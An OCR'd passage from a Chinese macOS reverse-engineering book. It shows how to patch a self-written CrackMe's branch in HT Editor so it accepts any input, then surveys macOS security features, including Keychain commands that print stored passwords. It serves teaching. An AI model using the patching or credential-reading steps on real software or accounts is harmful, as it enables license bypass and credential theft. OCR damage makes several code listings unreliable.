代码很简单，先要求用户输入一个数字，然后判断这个数字是否是“123”，如果不是则输出“Incorrect secret num.”，如果是则输出“Hello world!”。输入完成后按“esc”键退出编辑模式，输入:wq命令保存并退出Vim，然后使用Clang编译。

$c1ang cm01.c - o cm01

如果没有编译错误，就会生成cm01可执行文件；如果有错误，可以重新执行vim cm01.c命令，回到Vim中编辑代码的错误之处。然后测试一下CrackMe运行是否正常。

$./cm01
Please enter the secret num:456
Incorrect secret num.
$./cm01
Please enter the secret num:123
Hello world!
$.

当输入的数字不是“123”的时候，程序输出“Incorrect secret num.”，如果是“123”则输出“Hello world!”，说明程序运行正常。

接下来就要破解这个简单的CrackMe了，让它在我们输入任意值的时候都会输出“Hello world!”。

### 1.3 使用 HT Editor 进行破解

终于到破解环节了！如果这是你初次接触Mac上的破解，那么下面就将是你第一次亲手破解的程序。

这一节会用到少量的汇编指令和Mach-O文件格式的相关知识，后面的章节会详细讨论Mach-O文件格式和x86_64汇编指令，这里我们只需要知道几条关键汇编指令的含义即可，其余的都让HT Editor帮我们进行处理。

☐ jz指令：跳转指令，可以理解成如果前面比较指令的比较结果相同则跳转到指定的地址，如果不相等就不跳转，继续执行它下面的指令；

☐ jnz指令：与jz指令正好相反，不相等则跳转；

☐ jmp指令：不管任何情况都会进行跳转；

☐ call指令：调用过程指令，一般对应高级语言中的函数调用。

这些跳转指令的作用是什么呢？我们用高级语言所写的代码，最终都会被编译器翻译成机器码，其中的判断语句一般翻译成跳转指令，所以我们可以通过修改跳转指令达到修改软件的执行流程的目的，最终让目标程序跳过检查，执行我们所期望的代码。

有了理论基础，下面就该开始动手实践了。首先用HT Editor打开要破解的程序，也就是我们自己写的cm01。首先打开一个终端，并通过cd命令切换到cm01所在的文件夹，然后在终端中运行ht命令，会启动HT Editor的命令行界面，如图1-6所示。

 </div>

HT Editor在POSIX兼容系统上有些按键会有问题，需要用esc代替ctrl键，所以主菜单就变成了esc+红色字母，而下面的1到0快捷键分别对应的是fn+F1到fn+F10。首先按fn+F3（open），会出现选择文件的界面，如图1-7所示。

 </div>

然后按tab键将光标移到下面的列表框，找到cm01并回车，就会出现十六进制编辑界面，如图1-8所示。

 </div>

现在我们要把它切换到反汇编界面，按 $ f_{n}+F_{6} $（mode）出现select mode对话框，如图1-9所示。

 </div>

   </div>

选择Mach-O/image。disasm/x86和Mach-O/image的区别是，前者把整个文件当成二进制文件从头开始反汇编，而后者则会根据Mach-O文件格式对代码段进行反汇编。关于Mach-O文件格式将会在第5章进行详细的讨论，这里只需要知道为什么要这样做就可以了。

选择之后，HT会显示代码段的反汇编，如图1-10所示。

 </div>

有了反汇编代码，我们就需要阅读反汇编并找到判断数字是否正确的关键跳，并对其进行修改。HT为我们识别出了main函数，我们可以顺着main函数理清逻辑，这个CrackMe很简单，我们这么做也不是特别费力，但是如果代码比较复杂，这种方法就不适用了。

还有更简单的方法，当我们输入一个错误的数字的时候，程序会提示一句“Incorrect secret num”，我们可以用这句提示作为突破口。HT提供了一个搜索（search）功能，我们可以使用这个功能来查找这句错误提示。

首先，按快捷键fn+F7，出现搜索对话框，mode选择“display:regex”，表示使用正则表达式搜索HT界面中显示的字符，e为搜索的正则表达式，不过我们目前还用不到复杂的正则表达式，只需要输入“incorrect”就可以了。选中“case insensitive（不区分大小写）”，如图1-11所示。

 </div>

然后按回车，光标会定位到下面这行代码：

100000ee9 ! lea rdi, [strz_Incorrect_secret_num._100000f78]

这句汇编代码的意思是将100000f78这个地址放入rdi寄存器，100000f78中的内容是一个以0结尾的字符串（strz），内容为“Incorrect secret num.”，HT自动将内容中的空格换成了下划线。按shift+fn+F7可以继续搜索，但是在Mac上这个快捷键似乎无效。

我们到100000f78这个地址这里就可以看到“Incorrect secret num.”这个字符串。找到了这个字符串，那它上面的代码就应该是判断的跳转，往上一看，它上面就是如下代码：

100000ee3 ! jz l $ \underline{o} $c_100000f06
到100000f06处进行查看，会发现如下代码：

100000f06 !
..... ! loc_100000f06: ;xref j100000ee3
..... ! lea rdi, [strz_Hello_world_100000f8f]
100000f0d ! mov al, 0
100000f0f ! call wrapper_100001010_100000f28

这里将“Hello world”字符串的地址传给了一个函数，不难猜测，这个函数应该就是printf，到这里就应该是成功了。地址100000ee3处的跳转就是跳向成功的关键跳，也就是我们要修改的地方。

回到100000ee3处，按快捷键ctrl+a修改这里的汇编代码，修改成jnz loc_100000f06，将原来的相等则跳转改成不相等则跳转，如图1-12所示。

 </div>

回车后，HT会列出所写的汇编代码可以翻译成的机器码，因为x86和x64一条汇编语句可能对应多种机器码，这里选择和原来机器码长度相同的机器码最合适，既不需要填充nop指令，也不会覆盖后面的机器码。HT默认为我们选中了最合适的机器码，直接回车即可，如图1-13所示。

可以看到，实际上只修改了一个字节的机器码（变红的85），但此时的修改还没有保存到磁盘文件，按 $ f_{n}+F_{2} $进行保存。保存完后，红字就消失了，我们在来试试下面这个CrackMe程序。

$ ./cm01
Please enter the secret num:456
Hello world!
$ ./cm01
Please enter the secret num:123
Incorrect secret num.

 </div>

如果我们输入一个错误的数字，会输出“Hello world!”，输入正确的反倒提示失败了，这说明我们的修改成功了！

不过还是有点不完美，我们希望输入正确的数字也要提示成功。虽然在实际使用中乱猜正好输入了正确的数字可能性太低了，但是我们要在技术上追求完美。回到HT，找到跳转指令，按ctrl+a快捷键，这次我们把jnz改成jmp，让它无论数字正确与否都直接跳到打印“Hello world!”处，回车保存，再次测试如下。

$./cm01
Please enter the secret num:74551122
Hello world!
$./cm01
Please enter the secret num:123
Hello world!
$./cm01
Please enter the secret num:6697
Hello world!

哈！不管输入什么都会提示成功了！第一次的破解之旅到此完美结束！

### 1.4 本章小结

本章介绍了最基本的分析环境搭建和一个简单程序的破解。通过本章的学习，相信你已经对macOS系统上的软件逆向分析技术有基本的认识了。

# 系统安全架构

macOS虽然属于UNIX系的操作系统，但在安全性方面，有着自己独特的系统架构与安全保护措施。苹果系统真正的变革是在迈入版本10之后，从10.0到10.6，系统都以Mac OS X命名，并且以大型猫科动物的名字作为系统代号。从版本10.7到10.11，系统又改名为OS X。到了版本10.12时，更名为macOS。每一次系统的重命名，都代表着系统全新的变化，每一次系统的跨版本更新，都会带来许多新的安全特性。从版本10.6 Snow Leopard雪豹以后，OS X正式放弃了PowerPC架构，进入了x86-64时代。本章主要探讨苹果系统在该版本之后引入的安全特性。

### 2.1 系统架构概述

在一些公开的演讲与技术报告中，苹果公司向公众展示了一些系统架构方面的信息。整个操作系统按照分层的方式进行组织，一种典型的针对非开发人员的分层方式将系统分成了以下4层。

□ User Experience：用户体验层。包括Aqua、Dashboard、Spotlight、Dock、输入法、屏幕保护、Accessibility（辅助功能）、语音、位置与地图、搜索等内容。

□ Application Framework：应用框架层。包括Cocoa，用于OS X系统上应用程序的开发。

□ Graphics and Media: 图形和媒体层。包括核心框架、OpenGL、OpenGL、Quartz、SceneKit、SpriteKit等。

☐ Darwin：系统核心层。包括系统内核及shell环境等。

Darwin（达尔文）是苹果公司开发的一套UNIX实现，它继承了UNIX上一些传统的特性，如shell环境、目录结构、文件权限等。

在macOS开发文档中，展示了另一种针对开发人员的分层方式，如下所示。

☐ Cocoa Layer: Cocoa框架层。包括了用于开发界面程序的框架集合。

□ Foundation Layer：基础框架。提供了程序开发时使用到的基础数据类型、数值处理、网络/文件IO、日期等方方面面的接口。可以说，开发可视的Mac App基本离不开它。

Media Layer：媒体层。提供了图像、声音、视频、动画及游戏开发需要的接口。

Core Service Layer：核心服务层。提供了系统安全、底层、内部数据访问及存储的接口。如AddressBook用于访问地址薄、CoreData用于数据存储、QuickLook用于快速浏览插件开发。另外，CoreFoundation框架属于这一层。

☐ Core OS Layer：核心系统层。包括加速器、蓝牙、异常处理、网络扩展、系统配置等框架。

☐ Kernel & Driver Layer: 内核与驱动层。包括开发设备驱动程序与内核扩展所需的一些框架。

对于一般的开发人员而言，内核与驱动层基本不会用到，而前面5层框架在开发不同场景的应用时，或多或少会有所涉及。本书将在第3章中着重探讨前3层框架。

#### 2.1.1 shell 环境

Linux用户对于shell环境并不陌生，大多数Linux上的命令行工具在macOS中也可以使用。如ls命令列目录。打开系统自带的终端程序，执行命令ls -l /bin/*sh会输出系统支持的shell如下：

$1S -1 /bin/*sn

-r-xr-xr-x 1 root wheel 628496 Dec 3 14:36 /bin/bash
-rwxr-xr-x 1 root wheel 378624 Dec 3 14:36 /bin/csh
-r-xr-xr-x 1 root wheel 1394432 Dec 3 14:36 /bin/ksh
-r-xr-xr-x 1 root wheel 632672 Dec 3 14:36 /bin/sh
-rwxr-xr-x 1 root wheel 378624 Dec 3 14:36 /bin/tcsh
-rwxr-xr-x 1 root wheel 573600 Dec 3 14:36 /bin/zsh

#### 2.1.2 目录结构

在macOS系统中保留着很多与UNIX相同的目录。如/usr/bin目录中存放着用户安装的命令行工具，/etc目录存放着系统的配置信息。典型的macOS系统目录如下：

drwxrwxr-x+ 157 root admin 5338 Mar 2 11:45 Applications
drwxr-xr-x+ 63 root wheel 2142 Oct 22 15:19 Library
drwxr-xr-x@ 2 root wheel 68 Oct 9 11:41 Network
drwxr-xr-x@ 4 root wheel 136 Jan 23 11:35 System
drwxr-xr-x 7 root admin 238 Jan 5 11:10 Users
drwxrwxrwt@ 6 root admin 204 Mar 1 21:10 Volumes
drwxr-xr-x@ 39 root wheel 1326 Jan 23 11:34 bin
drwxrwxr-t@ 2 root admin 68 Oct 9 11:41 cores
dr-xr-xr-x 3 root wheel 7856 Feb 28 19:30 dev
lrwxr-xr-x@ 1 root wheel 11 Oct 9 11:40 etc -> private/etc
dr-xr-xr-x 2 root wheel 1 Feb 28 19:30 home
dr-xr-xr-x 2 root wheel 1 Feb 28 19:30 net
drwxrwxr-x@ 5 root wheel 170 May 31 2015 opt
drwxr-xr-x@ 6 root wheel 204 Oct 9 11:41 private
drwxr-xr-x@ 59 root wheel 2006 Jan 23 11:34 sbin
lrwxr-xr-x@ 1 root wheel 11 Oct 9 11:40 tmp -> private/tmp
drwxr-xr-x@ 12 root wheel 408 Feb 24 13:04 usr
lrwxr-xr-x@ 1 root wheel 11 Oct 9 11:40 var -> private/var

macOS在UNIX的基础上，在根目录下为自己添加了部分特有的目录。

□ /Applications: 应用程序目录。该目录存放了系统与用户安装的应用程序，运行Launchpad，所有安装的程序会以列表形式展示出来。

□ /Library：存放系统应用的数据及文档信息。

☐ /Network：网络邻居虚拟目录。

☐ /System：只有一个Library子目录，里面存放了系统运行的重要组件，如框架与内核模块。一些系统内置的第三方程序也在该目录下，如Perl。

□ /Users：所有用户的主目录都位于此目录下，在该目录下，每个用户会创建一个以自身用户名命名的目录，里面存放着该用户使用到的数据。

□ /Volumes：可移动媒体、磁盘、dmg镜像的挂载点。

#### 2.1.3 文件权限

UNIX系统使用r（读）、w（写）、x（执行）来描述所有文件的权限。而单个文件和用户组的概念在macOS中也保留下来了，这也是文件系统权限控制的基础。

macOS系统内置了staff、wheel、admin这3个用户组。其中创建的所有用户都属于staff用户组，该组提供了对当前用户自己目录的读写执行权限。其他用户访问当前用户的权限则是读或读执行权限。而admin组的用户则允许用户通过sudo命令切换为root用户，默认创建的用户也属于admin用户组。wheel用户组是root用户组，只有uid为0的root用户才属于该组。

在终端中执行id命令查看用户组信息：

$id
uid=501(macbook) gid=20(staff)
groups=20(staff),501(access_bpf),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),701(com.apple.sharepoint.group.1),702(com.apple.sharepoint.group.2),33(_appstore),100(_lpoperator),204(_developer),395(com.apple.access_ftp),398(com.apple.access_screensharing),101(com.apple.access_ssh-disabled)

执行sudo id可以看到，root用户属于wheel组：

$ sudo id
Password:
uid=0(root) gid=0(wheel)
groups=0(wheel),1(daemon),2(kmem),3(sys),4(tty),5(operator),8(procview),9(procmod),12(everyone),20(staff),29(certusers),61(localaccounts),80(admin),702(com.apple.sharepoint.group.2),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),395(com.apple.access_ftp),398(com.apple.access_screensharing),101(com.apple.access_ssh-disabled),701(com.apple.sharepoint.group.1)

### 2.2 系统调用

在UNIX架构的系统中，应用程序无法直接访问系统底层硬件资源，所有的操作最终通过系统调用来进行访问。系统调用属于内核暴露出的系统调用接口，传统的UNIX定义了一套完整的POSIX调用规范。实现了该规范的操作系统可以方便地移植出跨系统平台的应用程序。每个系统

   </div>

调用都有自己的调用原型声明与唯一的系统调用号。

macOS系统实现了POSIX标准，并且扩展了部分内容——加入了Mach Trap（Mach陷阱），取名为xnu。xnu内核是开源的，开发人员以及安全研究人员可以到苹果官网下载xnu的源代码进行学习，地址是：http://www.opensource.apple.com/source/xnu/。

在xnu源代码目录的BSD/sys/syscall.h文件中，有系统调用的声明，在libsyscall目录下，可以看到系统调用的具体实现，libsyscall/Platforms/MacOSX/x86_64/syscall.map是一份x86_64系统的调用表声明。custom/SYS.h头文件中，声明了所有系统调用的宏定义。代码如下：

#define UNIX_SYSCALL_SYSCALL \
movq %rcx, %r10 ;\
syscall

#define UNIX_SYSCALL(name, nargs) \
.glob1 cerror ;\
LEAF(#name, 0) ;\
movl $ SYSCALL_CONSTRUCT_UNIX(SYS_##name), %eax ;\
UNIX_SYSCALL_SYSCALL ;\
jnb 2f ;\
movq %rax, %rdi ;\
BRANCH_EXTERNAL(_error) ;\

2:

$ SYSCALL_CONSTRUCT_UNIX(SYS_##name)展开后表示的是系统调用的编号，将它的值传入eax寄存器后，调用UNIX_SYSCALL_SYSCALL，后者实际调用了x86_64汇编指令syscall。

### 2.3 进程间通信

负责进程间通信(IPC)是系统内核要做的一项重要工作。传统的UNIX系统都支持通过socket、管道、消息队列、通知、共享内存等方式进行进程间通信，macOS除了支持上述通信方式外，还支持一些特殊的通信方式，典型的有以下几种。

□ Mach端口(Mach Ports)。这是一种底层的进程间通信方式，它依赖于OSX内核提供的API，消息发送方调用mach_msg_send()发送消息，消息参数中指定了要发送的端口号、消息的内容及类型。消息接收方调用mach_msg_receive()来接收指定端口的消息。在上层，Core Foundation框架提供的CFMachPort，以及Foundation框架提供的NSMachPort对Mach端口进行了封装，以便开发者进行更简单的调用。

口分布式通知（Distributed Notifications）。使用消息发布、订阅对自身通知中心实例进行管理。接收通知的进程在通知中心（NSDistributedNotificationCenter）中注册一个观察者，随后被观察的进程发出一个通知（NSDistributedNotification），观察者就能接收到通知并作出响应。这种机制类似于安卓系统中的广播组件。另外，发送分布式通知非常耗系统资源，如果应用程序间需要频繁地进行通信，最好考虑使用其他通信方式。

NSConnection。这是一种比较方便的进程间通信方式。负责接收处理数据的进程注册一个特定名字的NSConnection，发送数据方便用NSConnection类的rootProxyForConnection-WithRegisteredName()方法找到注册的观察者类，然后通过performSelector()调用该类的数据处理方法。这种通信方式的运作完全得益于Objective-C运行库的工作机制。

XPC。XPC是另一种广泛使用的进程间通信方式，macOS系统自身也大量地使用了该技术。

使用XPC的一大好处是将App拆分成多个进程，实现代码逻辑的解耦合，使用XPC方式很容易开发出插件式应用程序。不过，使用XPC的方式与前面的通信方式不同，需要重新为每个功能模块创建一个新的XPC Service，它本质上是一个Bundle包，以.xpc结尾的模块形式存在，存放于XPCServices目录下，最终一起打包到程序包或框架中。

XPC的使用很简单。App通过创建NSXPCConnection对象来完成到XPC service的通信连接，以后就可以通过该连接的remoteObject与XPC Service进行通信了。XPC Service使用NSXPCListener对象来监听从App传入的请求，在监听类中构造NSXPCInterface，设置NSXPCInterface的exportedObject为逻辑功能的类就可以了。exportedObject导出的类通常是实现某些逻辑功能的接口类，也就是App端调用的remoteObject。详细的XPC Service信息可以访问：https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html。

### 2.4 安全框架

安全框架，顾名思义就是提供安全接口的框架。它是系统安全的基础设施，为整个系统提供强有力的安全防护。

在macOS 10.7以前，苹果公司使用CDSA（Common Data Security Architecture）作为系统的安全框架。它是一套完整的安全体系架构规范，由Open Group维护。

随着iPhone与iPad设备的大卖，安全性与运行性能成为了苹果公司需要关注的一个重点。另一方面，由于联邦信息处理标准（FIPS）对于设备出售的限制，苹果公司需要一种全新的系统安全架构来替代老旧的CDSA，因此，10.7版本后，苹果弃用了CDSA，使用了一套自己研发的安全框架。新版本的安全框架位于系统的/System/Library/Frameworks/Security.framework目录下，它提供了全新加密算法库（CommonCrypto库）、私密内容存储方式（Keychain）和安全的网络通信库。这些新的安全特性旨在让开发人员在新的系统上开发性能更高、更安全的应用软件。

#### 2.4.1 CommonCrypto

早期的macOS系统的加解密算法库依赖于OpenSSL，该库近年来颇受安全研究人员关注，大大小小的漏洞层出不穷，CommonCrypto库的问世很大程度上就是为了在加密基础设施上将它替代。CommonCrypto将常用到的数字摘要算法和对称加密、非对称加密算法，通过SecTransform提供了统一的API调用接口，用苹果公司的话说，这是一个更安全、性能更高、对多线程支持更好的库。

使用CommonCrypto来实现加密与解密比较简单，首先需要引入安全框架的头文件Security/Security.h，通过SecEncodeTransformCreate()指定要使用的加解密算法，接着调用SecTransformSetAttribute()传入需要处理的数据，最后执行SecTransformExecute()就可以了。

下列代码片段展示了如何通过SecTransform提供的接口进行Base64加密：

#include <CoreFoundation/CoreFoundation.h>
#include <Security/Security.h>

char *sourceCString = "hello osx.";

void ShowAsString(CFDataRef data)
{
    CFStringRef str = CFStringCreateFromExternalRepresentation(
        kCFAllocatorDefault,
        data,
        kCFStringEncodingUTF8);

    CFShow(str);
    CFRelease(str);
}

int main(int argc, char *argv[])
{
    CFDataRef dataToEncode = CFDataCreate(
        kCFAllocatorDefault,
        (const unsigned char *)sourceCString,
        (strlen(sourceCString) + 1));
    CFErrorRef error = NULL;
    SecTransformRef encodingRef = SecEncodeTransformCreate(kSecBase64Encoding, &error);

    SecTransformSetAttribute(encodingRef, kSecTransformInputAttributeName, dataToEncode, &error);
    CFDataRef resultData = SecTransformExecute(encodingRef, &error);

    ShowAsString(resultData);

    CFRelease(encodingRef);
    CFRelease(dataToEncode);
    CFRelease(resultData);

    return 0;
}

#### 2.4.2 Keychain

安全框架引入了另一种技术——Keychain（钥匙串）。它允许开发者使用系统内置的密钥存储服务来存储一些私密信息，比如密码、密钥、证书等。这些信息会被加密存储到设备中，Keychain里保存的信息不会因为App被删除而丢失，在用户重新安装App后依然有效，数据依然还在。

Keychain可以理解为一个容器，每个Keychain又包含多个Keychain项，每个Keychain项用来存储真正的数据。macOS系统中大量使用Keychain来存储数据。比如Safari使用Keychain存储

Web表单密码, iMessage使用Keychain存储加密与签名密钥, 还有App开发者证书与连接的Wi-Fi密码也是使用Keychain来存储的。在macOS上, 系统提供了一个Keychain的界面管理程序Keychain Access。运行/Applications/Utilities/Keychain Access, 打开Keychain管理工具界面, 如图2-1所示。

 </div>

Keychain中保存的密码可以在这里解锁查看。双击需要查看的Keychain项，勾选Show password，会弹出用户密码验证框。输入登录用户名与密码就可以显示明文密码了，如图2-2所示。

 </div>

   </div>

该操作实际涉及Keychain的另一个概念：Keychain访问控制。在macOS中，Keychain中的每个Keychain项都是受保护的，里面包含了授权访问的控制信息，该信息被称为访问对象（access object），访问对象为每一个Keychain数据关联了一个或多个ACL（访问控制列表），每个ACL又包含了一个系统操作的验证标志，这些标志在进行解密与验证时会对操作的合法性进行验证。另外，每个ACL条目又包含了一份执行特定操作的可信任应用程序（trusted application）列表。整个ACL的工作机制就是采用白名单授权方式。当应用程序请求访问Keychain中的条目时，系统会通过该项Keychain条目的ACL来确定应用是否有访问权限。如果ACL为空，系统直接拒绝并给出反馈信息。如果存在ACL条目，系统则会遍历条目中可信任的应用程序列表，如果匹配到则直接允许用户访问。反之，如果该程序不在Keychain条目的可信任列表中，系统会提示用户输入Keychain的访问密码来解锁访问Keychain。

macOS默认为每个登录的用户创建一个Keychain并命名为login.keychain，里面保存了用户相关的一些密钥信息。除此之外，系统也允许用户或应用程序手动地创建Keychain。login.keychain会在系统启动成功后自动解锁，并且访问此Keychain时的密码与用户登录密码相同。它在第一次被创建时被指定为默认Keychain，应用程序在创建Keychain项时，如果不指定具体的Keychain，就会默认存储在它里面。

为了确保正确安全使用的Keychain，苹果公司给出了以下两点建议。

☐ 锁定未使用的Keychain。具体操作是打开Keychain Access，选中要操作的Keychain，然后点击菜单项Edit→Change Settings for Keychain "xxx"...，其中xxx是要操作的Keychain名称。在打开的对话框中将两个lock选项都勾选。

更改Keychain访问密码。由于默认创建的Keychain的密码与用户登录的密码相同，当用户密码泄漏后，Keychain中保存的密码数据也将不再安全，因此，强烈建议将Keychain的密码设置成与登录密码不同。具体操作是打开Keychain Access，选中要操作的Keychain，然后点击菜单项Edit→Change Password for Keychain“xxx”…，在弹出的对话框中修改密码。

除了Keychain Access，系统还提供了一个命令行工具security来操作Keychain。列出系统中所有的Keychain可执行如下命令：

$ security list-keychains
"/Users/macbook/Library/Keychains/login.keychain"
"/Library/Keychains/System.keychain"

执行以下命令可以输出Keychain的内容:

$ security dump-keychain

$ security dump-keychain
keychain: "/Users/macbook/Library/Keychains/login.keychain"
class: 0x80001000
attributes:
"alis"<blob>="Apple Application Integration Certification Authority"
"cenc"<uint32>=0x00000003
"ctyp"<uint32>=0x00000001
"hpky"<blob>=0x31EA76A92374A5DFD4FDEEA0C1A69EC6110E11EC

"issu" <blob>=0x3062310B300906035504061302555331133011060355040A130A4150504C4520494E432E31263024060355040B131D4150504C452043455254494649434154494F4E20415554484F52495459311630140603550403130D4150504C4520524F4F54204341
"0b1\0130\011\006\003U\004\006\023\002US1\0230\021\006\003U\004\012\023\012APPLE
INC.1&0$\006\003U\004\013\023\035APPLE CERTIFICATION
AUTHORITY1\0260\024\006\003U\004\003\023\015APPLE ROOT CA"
"lab1" <blob>= "Apple Application Integration Certification Authority"
"skid" <blob>=0x31EA76A92374A5DFD4FDEEA0C1A69EC6110E11EC
"1\352v\251#t\245\337\324\375\356\240\301\246\236\306\021\016\021\354"
"snbr" <blob>=0x1B
"subj" <blob>=0x30818A310B300906035504061302555331133011060355040A0C0A4170706C6520496E632E31263024060355040B0C1D4170706C652043657274696669636174696F6E20417574686F72697479313E303C06035504030C354170706C65204170706C69636174696F6E20496E746567726174696F6E2043657274696669636174696F6E20417574686F72697479313E303C0603550403130\011\006\003U\004\006\023\002US1\0230\021\006\003U\004\012\014\012Apple
Inc.1&0$\006\003U\004\013\014\035Apple Certification Authority1>0<\006\003U\004\003\0145Apple
Application Integration Certification Authority"

在以上输出内容中，敏感数据没有显示，例如Safari表单登录密码。但可以使用security从命令行中读取KeyChain中指定的敏感数据，例如要查看用户名为“fei_cong”的OSC账号的登录密码，只需要执行以下命令即可：

$ security find-internet-password -a fei_cong -s git.oschina.net -g

执行完这条命令后，系统会弹出提示框，如图2-3所示。

 </div>

出于系统完全考虑，苹果不允许用户在没有安全措施的情况下直接访问敏感数据，选择Deny后，系统会拒绝显示密码；如果选择Always Allow，系统下次显示密码时就不会弹出提示，这是一种不好的操作习惯，建议用户不要使用此选项；选择Allow后，终端中会输出相关的密码信息如下：

$ security find-internet-password -a fei_cong -s git.oschina.net -g
keychain: "/Users/macbook/Library/Keychains/login.keychain"
version: 256
class: "inet"
attributes:
0x00000007 <blob>= "git.oschina.net"
0x00000008 <blob>= <NULL>
"acct" <blob>= "fei_cong"
"atyp" <blob>= "dflt"
"cdat" <timodate>=xxxxxx
"crtr" <uint32>= "aapl"
"cusi" <sint32>= <NULL>
"desc" <blob>= <NULL>
"icmt" <blob>= <NULL>
"invi" <sint32>= <NULL>
"mdat" <timodate>=xxxxxx"
"nega" <sint32>= <NULL>
"path" <blob>= <NULL>
"port" <uint32>=0x00000000
"prot" <blob>= <NULL>
"ptcl" <uint32>= "https"
"SCRP" <sint32>= <NULL>
"sdmn" <blob>= <NULL>
"srvr" <blob>= "git.oschina.net"
"type" <uint32>= <NULL>
password: "xxxxxx"

对于软件开发人员而言，苹果提供了一套SecItem API来实现Keychain中条目的添加、删除、修改与读取。添加条目使用SecItemAdd()，删除条目使用SecItemDelete()，修改条目使用SecItemUpdate()，读取则使用SecItemCopyMatching()。

以下代码片段展示了如何存储密码：

NS变色字

[attr setObject:kSecClassGenericPassword forKey:kSecClass];
[attr setObject:@ "MyAccount" forKey:kSecAttrAccount];
[attr setObject:password forKey:kSecValueData];

OSStatus error = SecItemAdd((CFDictionaryRef)attrs, NULL);
以下代码片段展示了如何读取密码：
NS变色字

[query setObject:kSecClassGenericPassword forKey:kSecClass];
[query setObject:@ "MyAccount" forKey:kSecAttrAccount];

OSStatus error = SecItemCopyMatching((CFDictionaryRef)query, (CFTypeRef *)&password);
在iOS平台上，有人开发出了针对越狱后系统转储KeyChain内容的工具Keychain-Dumper $ ^{®} $，把它不支持macOS系统。下面看看如何自己动手实现一个macOS版本KeyChain的转储工具。

下列代码是本节的keychain_dumper演示程序的内容，展示了与执行security dump-keychain命令相同的输出效果：

NS变色键

与iOS平台的Keychain-Dumper不同的是，此处演示的程序不能读取密码数据。事实上，苹果公司也不允许在未经用户同意的情况下，程序擅自读取用户的密码信息，因为苹果公司认为这是不合理也不安全的行为。如果操作部分需要读取用户密码，系统会弹出授权提示信息，例如Wi-Fi密码查看工具wifi-password（可以使用“brew install wifi-password”进行安装）读取当前系统的Wi-Fi密码时，就需要用户授权操作。

Keychain的安全基础依赖于ACL。每个ACL又依赖于其关联的访问对象，安全框架通过Keychain API提供了一系列接口来操作访问对象与ACL。创建访问对象使用SecAccessCreate()，读取访问对象中的ACL使用SecAccessCopyACLList()、SecAccessCopyOwnerAndACL()、SecAccessCopyMatchingACLList()等。具体的接口使用可以参考macOS开发手册。

#### 2.4.3 安全传输

苹果公司建议，在网络中传输隐私数据时，一定要使用安全传输方式，这就确保了数据在传

输过程中不被窃取与监听。为了阻止开发人员使用HTTP协议来传输明文数据，在WWDC 15大会上，苹果引入了一项隐私保护功能ATS（App Transport Security）。它是苹果在推进网络通信安全中的一项重要措施，在新版本的iOS 9与macOS 10.11系统中，非HTTPS的网络访问默认情况下是被禁止的。如果使用HTTP协议连接，会抛出一个错误，这直接导致的一个问题是，在系统升级后，之前直接使用HTTP来传输数据的软件在运行时都会出现问题。不可否认，开启ATS会给软件在安全性上带来明显的效果，并且这种效果在书中讲解网络类型软件破解时会有所体现，具体的内容会在后面的章节中展开。

但苹果这种激进地推行安全的举措，当时在国内开发圈内饱受争议。为了缓解程序员们不满的情绪，同时给所有使用HTTP通信的软件一个升级软件宽松的期限，苹果在系统中预留了手动关闭ATS的方法，只需要在软件配置文件Info.plist中，添加一个类型为Dictionary 的NSAppTransportSecurity项，并添加一个类型为Boolean的NSAllowsArbitraryLoads项，设置它的值为YES，即可禁用ATS。在WWDC 2016开发者大会上，苹果宣布，自2017年1月1日后，App Store 中的所有应用都必须启用ATS，使用NSAllowsArbitraryLoads来绕过ATS限制的方法将不再有效。这一声明表示苹果系统上的软件将迎来全民HTTPS的时代。

苹果的安全框架中实现了HTTPS传输数据依赖网络数据传输协议SSL（Secure Sockets Layer）与TLS（Transport Layer Security）。在macOS 10.11中，默认使用TLS的1.2版本作为加密传略协议。关于SSL与TLS的细节，此处不再详细展开，只需重点关注一下安全框架提供了哪些安全传输接口。

安全传输层比较底层，位于网络库（CFNetwork）之下，如图2-4所示。

 </div>

应用程序使用如下步骤进行安全传输。

##### ○ 预备会话

(1) 调用 SSLNewContext() 或 SSLCreateContext() 创建一个加密会话上下文。

(2) 调用 SSLSetIOFuncs() 设置 SSLWrite() 为 IO 写方法，SSLRead() 为 IO 读方法。

(3) 使用CFNetwork、BSD Sockets或Open Transport创建一个连接,然后调用SSLSetConnection()为连接指定第一步创建的加密会话上下文。

(4) 调用 SSLSetPeerDomainName() 指定端点域名。

(5) 调用 SSLSetCertificate() 指定验证时需要使用的证书（服务端为必需，客户端可选）。

##### ○ 开始会话

调用SSLHandshake()执行SSL的握手与连接。

##### ③ 操作会话

安全会话成功建立后，就可以传输数据了。可以调用SSLWrite()向服务器写数据，或者调用SSLRead()从服务器读取数据。

##### ① 结束会话

(1)通信结束后，可调用SSLClose()结束安全会话。

(2) 关闭连接并释放连接引用。

(3) 如果连接是使用SSLNewContext()创建的，调用SSLDisposeContext()来销毁安全连接上下文。如果是调用SSLCreateContext()，则调用CFRelease()来释放连接。

(4) 如果调用了 SSLGetPeerCertificates() 获取过任何证书的话, 需要调用 CFRelease() 释放证书引用对象。

下列代码片段展示了上面的流程：

OSStatus result;
PeerSpec peer;
int socket;
result = MakeServerConnection("https://www.xxx.com", 443, &socket, &peer);
SSLNewContext(false, &context);
SSLSetIOFuncs(context, SocketRead, SocketWrite);
SSLSetConnection(context, socket);
SSLSetPeerDomainName(context, "https://www.xxx.com", 30);

NSData *certificateData = [NSData dataWithContentsOfFile:certificate];
CSSM_DATA_data;
data.Data = (uint8 *)[certificateData bytes];
data.Length = [certificateData length];
SecCertificateCreateFromData(&data, CSSM_CERT_X_509v3, CSSM_CERT_ENCODING_BER, &certificate);

SecIdentityCreateWithCertificate(keychain, certificate, &identity);
CArrayRef certificates = CArrayCreate(NULL, (const void **)&identity, 1, NULL);

SSLSetCertificate(context, certificates);
do {
    result = SSLHandshake(context);
} while(result == errSSLWouldBlock);
char message[] = "hello SSL";
size_t processed = 0;
SSLWrite(context, &message, sizeof(message), &processed);
SSLClose(context);
CFRelease(identity);
CFRelease(certificate);
close(socket);
SSLDisposeContext(context);

在多数情况下，使用CFNetwork API来进行HTTPS的URL操作比直接调用安全传输层的这些接口要简单方便得多。CFNetwork还提供了一个CFNetworkHTTPDownload接口，方便通过安全连接的方式从一个URL下载文件。

如果使用CFNetwork的话，代码片段如下：

CFStringRef bodyString = CFSTR("hello SSL");
CFDataRef bodyData = CFStringCreateExternalRepresentation(kCF筝
           bodyString, kCFStringEncodingUTF8, 0);
